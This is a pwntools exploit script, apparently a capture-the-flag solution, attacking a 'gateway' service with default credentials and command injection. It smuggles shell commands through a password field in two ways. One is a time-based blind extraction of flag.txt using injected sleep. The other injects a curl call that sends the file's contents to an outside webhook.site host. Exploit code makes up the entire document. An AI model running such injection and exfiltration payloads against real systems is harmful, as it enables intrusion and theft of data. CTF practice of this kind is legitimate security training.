#!/usr/bin/env python3
from pwn import *
import string
import time

# =========================================================
#                          SETUP                         
# =========================================================
exe = './gateway'
elf = context.binary = ELF(exe, checksec=True)
context.log_level = 'info'
context.terminal = ["tmux", "splitw", "-h"]
host, port = 'vsc.tf', 7003

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
# FLAG = 'vsctf{'
FLAG = ''
POOL = string.ascii_letters + string.digits + string.punctuation

# blind command injection, cant revshell, box seemingly doesnt have access to internet
def exploit_when_for_some_reason_curl_doesnt_work_on_remote():
    global io
    global FLAG
    io = initialize()

    io.sendlineafter(b'Username:', b'admin')
    io.sendlineafter(b'Password:', b'123456')

    current_char = ''
    while current_char != '}':
        print(f'Trying IDX-{len(FLAG)+1} ', end='')
        for c in POOL:
            print(c, end='')
            payload = f'"; if [ "$(cut -c {len(FLAG)+1} flag.txt)" = "{c}" ]; then sleep 2; fi; #'

            start_time = time.time()
            io.sendlineafter(b'>', b'5')
            io.sendlineafter(b'password:', payload.encode())
            io.recvuntil(b'--- MENU')

            # check if time taken is more than 2 seconds
            if time.time() - start_time > 2:
                current_char = c
                FLAG += c
                print()
                log.success('FLAG: ' + FLAG)
                break
        print()

    io.interactive()
    
def exploit():
    global io
    io = initialize()

    io.sendlineafter(b'Username:', b'admin')
    io.sendlineafter(b'Password:', b'123456')

    webhook = 'https://webhook.site/327f6498-5c97-4286-a300-8b39100814c8'
    cmd = 'cat home/user/flag.txt'

    io.sendlineafter(b'>', b'5')
    io.sendlineafter(b'password:', f'"; curl {webhook} -d "$({cmd})"; # '.encode())

    io.recvuntil(b'--- MENU')
    io.close()


if __name__ == '__main__':
    # exploit_when_for_some_reason_curl_doesnt_work_on_remote()
    exploit()